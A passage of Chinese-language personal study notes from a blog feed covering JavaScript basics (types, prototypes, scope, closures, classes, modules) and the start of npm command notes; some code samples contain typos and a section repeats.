不绝对等于（值和数据类型其中有一个或者都不相等）\n\u0026amp;\u0026amp; 必须都要符合要求\n|| 只有一个符合要求\n! 真为假，假为真（当判断为true时返回false，判断为false时返回true）\n逻辑运算的结果为布尔值\n类型判断\n数据类型有undefined，null，boolean，number，string，object，symbol，BigInt（ES2020）\nundefined，该变量没有被赋值\nnull，该变量的值为空的对象指针\nboolean，该变量的值为布尔值\nstring，该变量的值为字符串\nnumber，该变量的值为数值\nobject，该变量为对象或者null\nSymbol，生成一个全局独一无二的值\ntyoeof操作符会返回该变量的值或者该值是什么数据类型\n注意：null值表示一个空对象指针，所以使用typeof操作符检测null时会返回object，typeof个函数，会返回function\ntypeof判断null之类的不合适，在这种情况可以使用instanceof\ninstanceof会检查构造函数的prototype属性是否在某个实例的原型链上\n例如：\nvar abc = new testa() if(Object.getPrototypeOf(abc) === testa.prototype){}\ninstanceof判断null\nnull instanceof Object // false\n返回布尔值,例如\nvar arr = [1,1,2,3,4,5]; console.log(arr instanceof Array); // 返回true\nconstructor 返回初始化该变量的值的数据类型的构造函数，例如 var home = \u0026ldquo;chenjunlin\u0026rdquo;; console.log(home.constructor); // 返回String() { [native code] }\ntoString.call 例如： toString.call(null); // 返回[object Null]\n原型与原型链\n原型：每一个对象（null除外）在被创建的时候会关联另外一个对象，而这个对象就是原型，每一个对象都会在原型那里继承属性\n原型链：每个构造函数都有prototype属性，通过new创建的实例可以访问到原型的属性和方法，实现的原理就是原型链，通过__proto__属性指向prototype属性，当该对象没有某个属性就会通过__proto__去查找构造函数的prototype属性，如果还是没有，那么就是会查找构造函数原型的__proto__，这个查找的过程就是原型链\n每一个函数都有一个prototype属性，这个属性指向函数的原型对象\n每一个对象都有一个__proto__属性，这个属性指向该对象的原型\n每一个原型都有一个constructor属性，这个属性指向构造函数\n构造函数通过new建立一个实例，这个实例可以通过__proto__找到它的原型,再通过constructor指向到构造函数\n通过new创建一个实例，会新建一个空对象，然后将该对象的__proto__属性指向构造函数的prototype，再通过apply指向这个新对象。执行构造函数并且返回执行结果\n因为实例的__proto__属性指向于实例的原型，而这个原型可以通过constructor属性指向到构造函数\n例如：\nfunction home(a,b){\rthis.a = a;\rthis.b = b;\r}\rvar gpp = new home('hi','chenjunlin');\rconsole.log(gpp.__proto__ == home.construction);\rconsole.log(gpp.__proto__.constructor == home);\rconsole.log(home.prototype == gpp.__proto__);\r结果全部为true\nclass\nclass test{\rconstructor(hi){\rthis.hi = hi;\r}\rprint_go(){\rconsole.log(this.hi);\r}\r}\rnew test('hello').print_go();\r继承\nclass test_a extends test {\rconstructor(hi, abc){\rsuper(hi);\rthis.abc = abc;\r}\rabc_1(){\rconsole.log(`hi,${this.hi}`);\r}\r}\rlet go = new test_a('no','chenjunlin');\rconsole.log(go.hi, go.abc);\rgo.abc_1();\rgo.print_go();\rinstanceof\ninstanceof 可以判断一个引用是否属于某构造函数\n例如：\nfunction obj(hemo,go){\rthis.hemo = hemo;\rthis.go = go;\r}\rvar no = new obj('go',10)\rconsole.log(no instanceof obj);\r结果为true，说明no实例的构造函数为obj\n作用域与闭包\n作用域\n当某一个执行环境的程序执行完毕后，该环境会被销毁，保存在其中的变量和函数也跟着销毁\n全局执行环境当应用程序退出时才会被销毁（例如关闭网页）\n全局执行环境被认为是window对象。因为所欲全局变量和函数都是作为window对象的属性和方法创建的\n每一个函数都有一个自己的环境，当执行到某个函数时，该函数的环境就进入一个环境栈中，当函数执行完毕后，则环境栈会弹出该环境\n当程序在一个环境中执行时，会建立一个作用域链，是为了保证有权访问该环境的所有有序变量和函数\n在一个环境内部定义的变量或者函数不能影响到外部的变量或者函数，只作用于该环境内部\n例如： var hi = \u0026ldquo;hello\u0026rdquo;; function no(){ var hi = \u0026ldquo;hi\u0026rdquo;; console.log(hi);\nfunction go(){\rvar abc = \u0026quot;go\u0026quot;;\rhi = \u0026quot;abc\u0026quot;;\rconsole.log(abc);\rconsole.log(hi)\r}\rgo();\r}\rno();\rcosole.log(abc);\rconsole.log(hi);\r有三个环境，全局环境，abc的局部环境，go的局部环境\n自由变量\n当在某一个作用域上要使用某个变量，但是没有在该作用域中声明，需要到其他作用域中找到这个变量，而这个变量为自由变量，例如:\nvar a = 100;\rfunotion c(){\rvar b = 1;\rconsole.log(a + b); // a为自由变量\r}\rc();\r取a的值要到另一个作用域中获取，要到创建这个被执行函数的作用域中（函数c是在全局作用域中被创建的）取值，所以要到创建函数c的作用域中获取到a的值，如果在创建的作用域中也没有找到该变量，那么会一直向上找，一直找到全局作用域，还是没有找到就抛出错误，而这个沿着作用域一直向上级寻找的机制叫作用域链\n延长作用域链\n只有两种情况可以延长：with语句和try-catch语句的catch块，例如：\nfunction abc(){\rvar a = \u0026quot;/index.html\u0026quot;;\rwith(location){\rvar url = href + a;\r}\rreturn url;\r}\rvar o = abc()\rconsole.log(o);\r父对象的所有变量，对子对象都是可见的，但是子对象的所有变量，父对象是不可见的\nthis\n每一个作用域中都绑定了一个特别的关键字：this\nthis的值不取决于它所在的位置，取决于它是怎么被调用的（父级）\n在全局作用域下，this表示为window对象，例如:\nvar name = \u0026quot;this\u0026quot;;\rconsole.log(this.name);\rconsole.log(window.name);\r改变this的值：\ncall(),apply(),bind()\n例如： var a = function(){ console.log(this); } a.call(\u0026lsquo;hi\u0026rsquo;);\n闭包：当外层函数嵌套了内层函数时，这个内层函数调用了外层函数作用域的变量，并且这个内层函数全局可访问（这个被调用的变量不会因为外层函数执行结束而被垃圾回收机制清除）\n错误代码捕获\ntry{\rvar a = null;\rvar b = a.length;\r}catch (error){\rconsole.log('出错了：' + error.message);\r}finally {\rconsole.log('yes');\r}\r把可以出现错误的代码放在try语句中，如果没有出错，那么catch语句不会执行（相反，如果出错则执行该语句），最终执行finally语句(无论是否出现错误，该语句都会执行)\nJavaScript中有一个对象来表示错误（Error），其他错误都是继承于该类型\n例如：\nError，TypeError，ReferenceError，SyntaxError，URIError，RangeError，EvalError\n没有通过try-catch处理的错误都会触发window对象中的error事件，该事件有五个参数，分别是错误信息，所在文件（或者url），行，列，错误对象\nwindow.onerror = function(message, source, lineno, colno, error){}\n监测设备是否网络连接中，html5中提供了一个属性navigator.onLine，返回的值为布尔值，当网络离线，返回false，正常网络连接则为true\n例如：\nconst app = navigator.onLine;\rif(app){\rwindow.addEventListener(\u0026quot;offline\u0026quot;,function(){\rconsole.log(\u0026quot;当前网络已经离线\u0026quot;)\r})\r}else{\rwindow.addEventListener(\u0026quot;online\u0026quot;,function(){\rconsole.log(\u0026quot;当前恢复网络正常\u0026quot;)\r})\r}\r这里通过navigator.onLine的初始值，来确定当前是否连接，然后监听网络变化\nonline事件：网络状态从离线到在线触发\noffline事件：网络状态从在线到离线触发\n数据类型\nJavaScript数据类型有7种（es6），分别是数值（number），字符串（string），布尔值（boolean），undefined，null，对象（object），Symbol\nSymbol不会在这里写，以后会独自写一篇es6的笔记\n返回一个值是哪个数据类型的，typeof 值\n数值有整数和浮点数\n因为JavaScript中，数值都是用64位浮点数表示，所以JavaScript这个语言的底层中其实是没有整数这个东西的\n浮点数是不精确的，主要是因为位运算，位运算虽然处理速度快，但是精度差\nJavaScript的浮点数的取值范围为2的负1023次方到2的1024次方，当一个数超过这个范围则溢出（大于范围返回Infinity）（小于范围则返回0）\nNumber.MAX_VALUE和Number.MIN_VALUE分别是能表达的最大值和最小值\nInfinity表示无穷，一般是数值太大或者数组太小导致的，当一个非0的数被0除，也会返回，Infinity也有正负之分\nNaN表示非数值，一般是把字符串当成数值处理导致的，NaN是一个特殊的数值，是Number数据类型下的，NaN不等于任何值，包括它本身\n字符串（string）和布尔值（boolean）就不写了，理解这些很轻松的\nnull和undefined\n这俩个都表示“无”或者“空\u0026quot;，在if判断中也是定位false，==比较也表示相等\nnull表示一个空的对象，undefined用来表示为没有定义（例如一个变量声明了，但是没有赋值）\n对象（object）\n对象就是一个键值对（key-value），一个键名对应一个键值，例如：\nvar obj={\ruser : \u0026quot;root\u0026quot;,\rpass : \u0026quot;123\u0026quot;\r}\ruser是键名，root为键值，多个键值对用逗号分隔\n键值可以是任意数据类型，例如\nvar obj={\ryes: function(a){\rreturn a+a*2;\r}\r};\robj.yes(10)\r对象opj的键名yes指向了一个函数\n对象的键名也叫属性，如果属性的值是一个函数，那么这个属性可以叫为方法\n并不需要在声明对象的时候指定属性，可以动态创建，JavaScript允许在任何时候都可以定义属性\n对象是引用类型，对象实质上就是一个对象的属性指向一个地址，这个地址可以是任意数据类型，也就是说，只要有变量指向了某一个对象，那么这个变量可以读取和修改该对象的属性和值\n注意：获取对象的属性，可以使用点运算符和方括号运算符（但是数值键名不能使用点运算符，会认为是小数，可以获取属性，也可以修改属性值），键名会自动修改为字符串（因此键名可以不加引号也可以不加引号）\n查看对象的所有属性Object.keys(obj)\n删除对象的某个属性delete obj.yes（但是不能删除继承过来的属性，只能删除对象本身带有的）\n检查某个对象的某个属性是否存在 \u0026lsquo;yes\u0026rsquo; in obj\n允许通过for循环来遍历某个对象的全部属性，例如：\nvar obj = {\ruser : root,\rpass : root\r}\rfor (var i in obj){\rconsole.log(i);\rconsole.log(obj[i]);\r}\r注意：该方法不能遍历不可遍历的属性，而且还会遍历继承过来的属性，因此一般会用hasOwnProperty来判断一下是否是对象本身的属性，例如：\nfor (var i in obj){\rif (obj.hasOwnProperty(i)){\rconsole.log(i);\rconsole.log(obj[i]);\r}\r}\r如果想操作某个对象的多个属性时，可以使用with循环来操作，例如：\nwith(obj){\ruser=admin;\rpass=123;\r}\r注意：请确保该对象的属性是已经存在的，不推荐使用with来操作属性，毕竟with的内部作用域是当前的，不是全局\n函数\n函数的定义用function关键字来定义，例如：\nfunction hallo(x){\rreturn x+x*2;\r}\r将函数指向到一个变量中，那么这个函数可以叫函数表达式，使用函数表达式声明函数时，函数名只能在函数体内部有效，如果一个函数没有函数名，那么这个函数就是匿名函数\n构造函数\n构造函数的函数名习惯上首字母大写，调用构造函数需要new关键字，例如：\nfunction Yes(uesr,pass){\rthis.user = user;\rthin.pass = pass;\r}\rvar hallo = new Yes('root','123');\rconsole.log(hallo.user,hallo.pass);\r当使用new关键字调用构造函数时，会创建一个空对象，用来返回的实例对象，这个空对象的原型指向了构造函数Yes的prototype属性，根据原型和原型链的关系，得出hallo.prototype=Yes.prototype\n对象实例hallo的属性继承于构造函数Yes的属性，因此构造函数实质上就是给对象提供属性模板的，JavaScript内部有大量已经定义好的构造函数（有一部分来自浏览器提供），可以使用这些构造函数直接来实例化对象\n如果在调用的时候没有使用new关键字，那么这个函数无法生成实例对象，为了避免这个情况，一般会使用严格模式，在函数内部第一行加上\u0026rsquo;use strict\u0026rsquo;;\n注意：如果一个函数被多次声明，那么后面的声明会覆盖前面的声明\n函数的length属性，该属性会返回函数预期需要传入的参数的个数（固定为定义时的参数个数，不会随着传入的参数的个数而作出改变）\n函数的toString()方法，该方法会返回一个字符串，内容为该函数的源码（连换行符和注释都可以返回）\n函数作用域\n作用域有三种，分别是全局作用域和函数作用域，块级作用域（es6）\n在函数作用域中，在函数内部定义的变量，只能在该变量内部使用，因此有部分人会习惯会将全部程序放在函数中，直接调用函数，用来避免污染已经定义好的变量\n注意：如果一个函数的参数有同名的，会取最后一个值\nJavaScript允许函数不定数目的提供参数，而这需要用到arguments对象，例如：\nvar hallo = function(){\rvar a = arguments[0];\r}\rhallo(\u0026quot;hallo word\u0026quot;);\r注意：在严格模式下，使用arguments对象来操作参数会无效\n闭包\n一般情况下，在函数内部定义的变量无法被外部访问到，但是可以基于链式作用域结构，让子对象一级一级的向上寻找父对象的变量，父对象的变量，子对象都可以访问，但是子对象的变量，父对象无法访问，例如：\nfunction abc(){\rvar a = \u0026quot;hallo\u0026quot;;\rfunction xyz(){\rconsole.log(a);\r}\r}\r而闭包作用就是可以让子对象可以获取到父对象的同时，可以将变量始终保存在内存中，例如：\nfunction yes(a){\rreturn function(){\rreturn a++;\r}\r}\rvar gg = yes(1)\r每一次调用都是在上一次调用完的基础上计算，可以让该变量一直存在，如果不被垃圾回收机制处理，那么该变量会一直保存当前的值，提供调用\n闭包具有封装对象的私有属性和私有方法的功能，例如：\nfunction Ayes(user){\rvar name;\rfunction setName(a){\rname = a;\r}\rfunction getName(){\rreturn name;\r}\rreturn {\rname :name,\rsetName: setName,\rgetName: getName\r};\r}\rvar i = Ayes(\u0026quot;root\u0026quot;);\ri.setName(\u0026quot;chenjunlin\u0026quot;);\ri.getName();\r闭包的本质就是在一个函数内部建立另一个函数\n闭包的特性：\n函数嵌套函数\n在函数内部可以引用函数外部的变量或者参数\n变量和参数不会被垃圾回收机制清理\n例如：\nfunction a(){\rvar b = 'abc';\rreturn function(){\rreturn b;\r}\r}\rvar c = a();\rconsole.log(c());\ra()返回的值是一个匿名函数，这个函数在a()的作用域内部，所以可以获取a()作用域中的变量b的值，然后将这个值作为返回值赋值给全局作用域中的变量c\nvar a = 10;\rvar b = function(c){\rif(c\u0026gt;a){\rconsole.log(c);\r}\r}\rvoid function(abc){\rvar a = 100;\rabc(20);\r}(b);\r这是通过作用域链的特性，让局部作用域外部也可以获取到局部作用域内部的变量\n因为在局部作用域中可以获取到全局作用域的变量，而局部作用域通过向上返回值来达到传递值的目的\n当某一个执行环境的程序执行完毕后，该环境会被销毁，保存在其中的变量和函数也跟着销毁\n全局执行环境当应用程序退出时才会被销毁（例如关闭网页）\n全局执行环境被认为是window对象。因为所欲全局变量和函数都是作为window对象的属性和方法创建的\n每一个函数都有一个自己的环境，当执行到某个函数时，该函数的环境就进入一个环境栈中，当函数执行完毕后，则环境栈会弹出该环境\n当程序在一个环境中执行时，会建立一个作用域链，是为了保证有权访问该环境的所有有序变量和函数\n在一个环境内部定义的变量或者函数不能影响到外部的变量或者函数，只作用于该环境内部\n例如： var hi = \u0026ldquo;hello\u0026rdquo;; function no(){ var hi = \u0026ldquo;hi\u0026rdquo;; console.log(hi);\nfunction go(){\rvar abc = \u0026quot;go\u0026quot;;\rhi = \u0026quot;abc\u0026quot;;\rconsole.log(abc);\rconsole.log(hi)\r}\rgo();\r}\rno();\rcosole.log(abc);\rconsole.log(hi);\r有三个环境，全局环境，abc的局部环境，go的局部环境\n自由变量\n当在某一个作用域上要使用某个变量，但是没有在该作用域中声明，需要到其他作用域中找到这个变量，而这个变量为自由变量，例如:\nvar a = 100;\rfunotion c(){\rvar b = 1;\rconsole.log(a + b); // a为自由变量\r}\rc();\r取a的值要到另一个作用域中获取，要到创建这个被执行函数的作用域中（函数c是在全局作用域中被创建的）取值，所以要到创建函数c的作用域中获取到a的值，如果在创建的作用域中也没有找到该变量，那么会一直向上找，一直找到全局作用域，还是没有找到就抛出错误，而这个沿着作用域一直向上级寻找的机制叫作用域链\n延长作用域链\n只有两种情况可以延长：with语句和try-catch语句的catch块，例如：\nfunction abc(){\rvar a = \u0026quot;/index.html\u0026quot;;\rwith(location){\rvar url = href + a;\r}\rreturn url;\r}\rvar o = abc()\rconsole.log(o);\r父对象的所有变量，对子对象都是可见的，但是子对象的所有变量，父对象是不可见的\n另一篇笔记\n如果在body元素中添加script元素，那么在解析和执行JavaScript程序完成之前内容不会被出现在页面中，使用defer属性避免出现页面的内容的延迟呈现\ndefer属性只适用于外部脚本文件，将其脚本延迟到浏览器遇到后执行，会优先于DOM事件，按照先后顺序执行，把JavaScript脚本放在页面底部依然是最优的选择\nasync属性，同样只适用于外部脚本文件，该属性会告诉浏览器立即下载该文件，不按照先后顺序执行原则，所以使用async属性时确保该文件不依赖其它文件\nasync属性的目的是不让浏览器等待JavaScript下载和执行，让其在能异步处理其它内容\n当浏览器不支持脚本或者支持脚本，但是脚本被禁用时，使用noscript元素，当脚本无效时才会显示该元素的内容，如果脚本有效时，是不会显示在该元素的内容\nJavaScript区分大小写，标识符的第一个字符必须是一个字母或者小划线（_）又或者美元符合（$），其他字符可以是字母，下划线，美元符号或者数字\n驼峰大小写命名：第一个字母小写，剩下的每个单词的首字母大写，不用把关键字，保留字，true，false和null作为标识符\n注释：\n// 单行注释\n/*\n这是 块级（多行）注释 */ 除了/**/外，其他*不是必须要的，只是为了注释的可读性\n严格模式\n启用严格模式在顶部添加\u0026quot;use strict\u0026quot;;\n在函数内部的上方使用该指示，可以指定函数在严格模式下执行\n语句结尾的分号;不是必需的，如果省略分号，那么由解析器来确定语句的结尾，推荐在语句结尾加上分号;\n使用{}将多行语句组合成一个代码块，例如if语句，但是当语句只有一行时是可以不加{}，不过推荐加上{}\nECMA-262中有一组特殊用途的关键字和一些未来可能用到的保留字，这些都不能用于作标识符\n定义变量要使用var关键字+变量名（标识符），如果只定义变量，没有给该变量赋值，那么该变量会有一个特殊的值——undefined\n变量可以保存任意数据类型，变量不会因为赋值，就标记其为这个数据类型，可以多次赋值，每一次赋值就是覆盖该变量之前的值\n在函数中定义一个变量，那么在函数执行完毕退出时，该变量会被销毁，因为在函数中定义的变量会被认为该变量是局部变量，自作用于该变量的作用域中\n如果省略var关键字，那么该变量会成为一个全局变量，可以在函数外部的任何地方访问到，但是不推荐，如果在严格模式下将抛出错误\n可以使用var关键字定义多个变量，每个变量有,逗号隔开\n数据类型有undefined，null，boolean，number，string，object\nundefined，该变量没有被赋值\nnull，该变量的值为空的对象（还没有创建的对象）\nboolean，该变量的值为布尔值\nstring，该变量的值为字符串\nnumber，该变量的值为数值\nobject，该变量为对象或者null\ntyoeof操作符会返回该变量的值或者该值是什么数据类型\nundefined类型\n使用var声明变量时没有给其初始化，那么该变量的值为undefined，未经过初始化的值默认得到undefined\nnull类型\nnull值表示一个空对象指针，所以使用typeof操作符检测null时会返回object\nboolean类型（布尔值）\n该类型只有两个值，true和false，注意是区分大小写的\nboolean类型和其他数据类型有等值的关系，使用Boolean()函数转换为boolean数据类型\n空字符串（\u0026rsquo;\u0026rsquo;）会返回false，非空字符串返回true，非0数字（包括无穷大）为true\n0和NaN未false，任何对象（不包括null空对象指针）为true，null为false，undefined为false\nnumber类型\n表示整数和浮点数，整数可以表示十进制和八进制，十六进制。八进制必须是0开头（后面为0-7，超过了值当成十进制处理），十六进制必须是0x开头（后面为0-9和A-F）\n八进制，十六进制表示的数值最终都会被转换成十进制数值\n浮点数值必须包含一个小数点，而且小数点后面也必须有一位数字，如果浮点数本身表示的就是一个整数，该值会转换为整数\n对于那些极大或者极小的数组，可以使用科学计数法表示，科学计数法的e表示e前面的数值乘以10的指数\n最小的数值（Number.MIN_VALUE）,最大的数值（Number.MAX_VALUE）\n最小的值为5e-324，最大的值为1.7976931348623157e+308\n小于最小的值为-infinite（负无穷），大于最大的值为infinite（正无穷），infinite不能参与计算\n检查一个数是否在最小的值和最大的值之间，可以使用ifFinite()，当一个数在在最小的值和最大的值之间，那么返回true，否则返回false\nNaN类型\nNaN表示非数值，任何涉及NaN的操作，都是NaN，NaN不和任何值相等，包括NaN本身\n检查一个值是否\u0026quot;不是数值\u0026quot;，可以使用isNaN()，当不是数值时返回true，否则返回false\n但是isNaN会尝试转换为数值，如果可以被转换为数值的依然会返回false，所以类似\u0026quot;6\u0026quot;，true(可以转换为1)之类的也会返回false\n有三个函数可以把非数值转换数值，Number()，parseInt()和parseFloat()\nNumber()可以用于任何数据类型，而其他两个则是把字符串转换为数值\nNumber()的转换\ntrue为1，false为0\n数值，没有变化\nnull为0\nundefined为NaN\n字符串，当字符串只包含数字（浮点数，十六进制）时，转换为十进制的数值\n字符串为空（不包含任何字符）时为0\n字符串中包含除上面的外的字符，转换为NaN\n关于一段代码块后面是否要加分号，取决于个人习惯，如果习惯写Python，那么就可以不加，如果习惯写Java，那么加上就好，个人开发者怎么舒服怎么来，团队开发看团队习惯，就算没有加分号，浏览器解析时候也会正常解析的，并没有多大影响，不过推荐加分号\ndocument.querySelector(\u0026quot;\u0026quot;)；\n选择器只能选中第一个元素\ndocument.querySelectorAll(\u0026quot;\u0026quot;);\n可以选中所有符合选择器规则的元素\n.classList.add(\u0026ldquo;类名\u0026rdquo;) : 添加指定类样式\n.classList.remove(\u0026ldquo;类名\u0026rdquo;) : 移除指定类样式\n.classList.contains(\u0026ldquo;类名\u0026rdquo;); 判断是否包含指定类样式\n.classList.toggle(\u0026ldquo;类名\u0026rdquo;); 切换指定类样式\n自定义属性（dataset）\n标签中自定义属性名必须为data-开头\n.dataset： 获取全部自定义属性的属性名和属性值（属性名不包括data-），输出返回的结果为DOMStringMap\n该方法也可以直接定义新的属性和属性值，例如：\ndocument.querySelector(\u0026quot;.app\u0026quot;).dataset.name=\u0026ldquo;root\u0026rdquo;;\n或者document.querySelector(\u0026quot;.app\u0026quot;).dataset[\u0026ldquo;pass\u0026rdquo;]=\u0026ldquo;root\u0026rdquo;;\n文件读取(FileReader)\nFileReader中提供3个方法来将读取文件返回的结果进行处理在result中\n分别是： readAsText：文本 readAsBinaryString：字符串\nreadAsDataURL：dataurl readAsArrayBuffer：ArrayBuffer对象 abort：终止文件读取操作\nFileReader也提供了几种事件，分别是：\nonload：文件读取完成时触发 onloadend：文件读取完成时触发，不管是否读取成功，只要调用了FileReader()，那么最后都会触发该事件 onloadstart：读取开始时触发 onprogress：读取中时触发，该事件在读取过程每50ms就会触发一次，可以利用该事件设置进度条来表示读取的进度 onerror：读取出错时触发，该事件中有一个属性code，就是错误码，1表示没有找到该文件，2表示安全性错误，3表示读取中断，4表示文件不可读，5表示编码错误 onabort：读取中断时触发\n例如：\n\u0026lt;input type=\u0026quot;file\u0026quot; name=\u0026quot;\u0026quot;\u0026gt;\r\u0026lt;script\u0026gt;\rvar mainfile = document.querySelector(\u0026quot;input\u0026quot;);\rmainfile.onchange = function(){\rvar files = this.files;\rvar file = files[0];\rconsole.log(file.name); // 获取文件名\rvar maindata = new FileReader(); // 创建读取器\rmaindata.readAsDataURL(file);\rmaindata.onload = function(){\rconsole.log(maindata.result);\r// 转换为data_url\r}\r}\r\u0026lt;/script\u0026gt;\rJavaScript引用类型\nJavaScript的变量具有动态性的特性，就决定了变量只是用于保存该特定的值的名字\nJavaScript中有两种，基本类型值和引用类型值\n基本数据类型有数字，字符串，布尔值，null，undefined，（es6中加入了个symbol）\n基本类型是按值访问，可以直接操作保存在变量中的值\n基本类型值是简单的数据段，而引用类型是指由多个值组成的对象\n因为基本类型是按值访问的，所以可以操控保存在变量的值\n引用类型的值是保存在内存中的对象，JavaScript不允许直接访问内存中的位置\n操控对象，其实就是在操控对象的引用，而不是对象本身\nthis\n每一个作用域中都绑定了一个特别的关键字：this\n在全局作用域下，this表示为window对象，例如:\nvar name = \u0026quot;this\u0026quot;;\rconsole.log(this.name);\rconsole.log(window.name);\r改变this的值：\ncall(),apply(),bind()\n例如： var a = function(){ console.log(this); } a.call(\u0026lsquo;hi\u0026rsquo;);\n面向过程：根据步骤来一步步来实现解决问题\n面向对象（OOP）: 设置对象的功能来解决问题，封装性，继承性，多态性\n类和对象\n对象共用的属性和行为封装成一个类，对类进行实例化，获取类的对象\n对象是一组无序的相关属性和方法的集合，对象由属性（特征）和方法（行为）组成\n类\n关键字class声明的一个类，通过类实例化一个具体的对象\n创建类和生成实例\n创建类\nclass name{}\n实例化对象\nvar name = new name();\nconstructor构造函数\nconstructor()方法是类的构造函数（默认），用来传递参数，返回实例对象，通过new关键字生成的对象实例时，自动调用该方法\n例如：\nclass names{\rconstructor(name,age){\rthis.name = name;\rthis.pass = pass;\r}\r}\rvar abc = new names(\u0026quot;root\u0026quot;,123);\rconsole.log(abc);\rconsole.log(abc.name);\r共有方法：\n在类里面的函数不需要写function，同时多个函数或者方法不需要加逗号分隔例如：\nclass names{\rconstructor(name,age){\rthis.name = name;\rthis.age = age;\r}\rxyz(yes){\rconsole.log(\u0026quot;欢迎\u0026quot; + this.name+ \u0026quot;,\u0026quot; + yes);\r}\r}\rvar abc = new names(\u0026quot;root\u0026quot;,18);\rabc.xyz(666);\r类的继承\n子类可以继承父类的一些方法和属性，通过extends关键字，将父类属性和方法继承到子类中，例如：\nclass names{\rconstructor(name,age){\rthis.name = name;\rthis.age = age;\r}\rxyz(yes){\rconsole.log(\u0026quot;欢迎\u0026quot; + this.name+ \u0026quot;,\u0026quot; + yes);\r}\r}\rclass gg extends names {\r}\rvar abc = new gg(\u0026quot;root\u0026quot;,18);\rabc.xyz(666);\rsuper关键字，可以用于访问和调用父类是的函数，调用父类的构造函数或者普通函数\nclass names{\rconstructor(name,age){\rthis.name = name;\rthis.age = age;\r}\rxyz(yes){\rconsole.log(\u0026quot;欢迎\u0026quot; + this.name+ \u0026quot;,\u0026quot; + yes);\r}\r}\rclass gg extends names {\rconstructor(name,age){\rsuper(name,age);\r}\r}\rvar abc = new gg(\u0026quot;root\u0026quot;,18);\rabc.xyz(666);\rclass names{\rconstructor(name,age){\rthis.name = name;\rthis.age = age;\r}\rxyz(yes){\rconsole.log(\u0026quot;欢迎\u0026quot; + this.name+ \u0026quot;,\u0026quot; + yes);\r}\r}\rclass gg extends names {\rxyz(yes){\rconsole.log(super.xyz(yes));\r}\r}\rvar abc = new gg(\u0026quot;root\u0026quot;,18);\rabc.xyz(666);\r注意：\n继承中的属性或者方法查找是就近原则\n继承中，一个实例化子类输出一个方法，如果子类有这个方法，就先执行这个子类的方法\n继承中，如果子类没有，就去查找父类有没有这个方法，如果有就执行父类的方法\nsuper必须在子类构造函数this之前调用\n在es6中类没有变量提升，需要先定义类，再通过类来实例化对象\n类共有的属性和方法要加this使用\nthis指向问题\n在constructor里面的this指向的是创建的实例对象\n在方法里面的this指向的是实例对象，因为实例对象调用了该方法\nthis的指向取决于谁调用了，怎么调用的\nJavaScript模块化\n传统开发模式的问题\n命名冲突\n文件依赖\n模块化：指的是单独的一个功能封装到一个模块中，模块之间相互隔离，但是可以通过特定的接口公开内部成员，也建议依赖别的模块\n浏览器端模块规范\nAMD，CMD\n服务器端模块化\ncommonjs\nES6模块化（推荐使用，浏览器端与服务器端通用规范）\n在ES6语法规范中定义了ES6模块化规范\nES6模块化规范中定义：\n每个js文件都是一个独立的模块\n导入模块成员使用import关键字\n暴露模块成员使用export关键字\n模块化的基本语法\n默认导出：\nexport default 需要导出的成员名\n例如：\nlet a = 666\nexport default a\n默认导入：\nimport 接收名称 from \u0026ldquo;模块标识符\u0026rdquo;\n例如：\nimport abc from \u0026ldquo;./hallo.js\u0026rdquo;\n前后端交互模式\n接口调用方式\n原生ajax，jQuery的ajax，fetch，axios\n传统的url\nschema：协议\nhost：域名或者ip\nport：端口\npath：路径\nquery：参数\nfragment：锚点（哈希hash）\nRestful的url\nget查询\npost添加\nput修改\nDELETE删除\n","permalink":"https://99999.fun/posts/32/","summary":"JavaScript的变量具有动态性的特性，就决定了变量只是用于保存该特定的值的名字\nJavaScript中有两种，基本类型值和引用类型值\n基本数据类型有数字(Number)，字符串(String)，布尔值(Boolean)，null，undefined，（es6中加入了个symbol）,BigInt(ES2020)\n基本类型是按值访问，可以直接操作保存在变量中的值\n基本类型值是简单的数据段，而引用类型是指由多个值组成的对象\n因为基本类型是按值访问的，所以可以操控保存在变量的值\n引用类型的值是保存在内存中的对象，JavaScript不允许直接访问内存中的位置\n操控对象，其实就是在操控对象的引用，而不是对象本身\nJavaScript的逻辑运算\nJavaScript的任何数据类型都能转换为布尔类型\n\u0026lt; 小于 \u0026gt; 大于 \u0026lt;= 小于或者等于 \u0026gt;= 大于或者等于 == 没错，这个才是等于，=这个是用来赋值的 != 不等于 === 绝对等于（值和数据类型相等） !== 不绝对等于（值和数据类型其中有一个或者都不相等）\n\u0026amp;\u0026amp; 必须都要符合要求\n|| 只有一个符合要求\n! 真为假，假为真（当判断为true时返回false，判断为false时返回true）\n逻辑运算的结果为布尔值\n类型判断\n数据类型有undefined，null，boolean，number，string，object，symbol，BigInt（ES2020）\nundefined，该变量没有被赋值\nnull，该变量的值为空的对象指针\nboolean，该变量的值为布尔值\nstring，该变量的值为字符串\nnumber，该变量的值为数值\nobject，该变量为对象或者null\nSymbol，生成一个全局独一无二的值\ntyoeof操作符会返回该变量的值或者该值是什么数据类型\n注意：null值表示一个空对象指针，所以使用typeof操作符检测null时会返回object，typeof个函数，会返回function\ntypeof判断null之类的不合适，在这种情况可以使用instanceof\ninstanceof会检查构造函数的prototype属性是否在某个实例的原型链上\n例如：\nvar abc = new testa() if(Object.getPrototypeOf(abc) === testa.prototype){}\ninstanceof判断null\nnull instanceof Object // false\n返回布尔值,例如\nvar arr = [1,1,2,3,4,5]; console.log(arr instanceof Array); // 返回true","title":"JavaScript的一些基础知识扩展"},{"content":"npm是Node.js的默认包管理工具\n安装npm：安装node.js(一般来说安装nodejs都会安装npm的)\nnpm -v 查看npm版本号 node -v 查看node版本号 npm install nmp@latest -g 更新最新nmp，-g全局，没有加-g就是本地安装，或者在@后面加版本号来更新到指定版本的npm npm init -y 初始化 npm i 要安装的依赖 先检查有没有这个东西，有的话就下载下来 npm uninstall 要删除的依赖的名称 npm i 要安装的依赖@版本号 安装指定版本的依赖 npm update 依赖名称 安装最新的依赖或者更新npm npm init -y 使用默认的参数，去掉-y就是手动配置 npm run 对象名 执行脚本,引用package.json中的scripts对象，在对象中添加脚本 npm adduser 注册npm账号 npm publish 发布npm包 npm install 一键安装package.json文件里的所有依赖 npm install \u0026ndash;dependencies 只安装package.json里的dependencies的文件 npm install \u0026ndash;devDependencies 只安装package.json里的devDependencies文件 会自动将package.json中的模块安装到node-modules文件夹\n升级插件 npm-check-updates使用 npm install -g npm-check-updates 安装npm-check-updates插件 ncu 查看package.json中依赖的最新版本 ncu -u 更新依赖到最新版本 ncu -a 更新全部依赖到最新版本 npm update\n该升级插件和npm自带的差别在于npm自带的只能通过package.json文件中所标注的版本号更新，要手动更改，而该升级插件会自动更新package.json文件中所标注的版本号\n安装淘宝 NPM 镜像 npm install -g cnpm \u0026ndash;registry=https://registry.npm.taobao.org\n全局设置淘宝 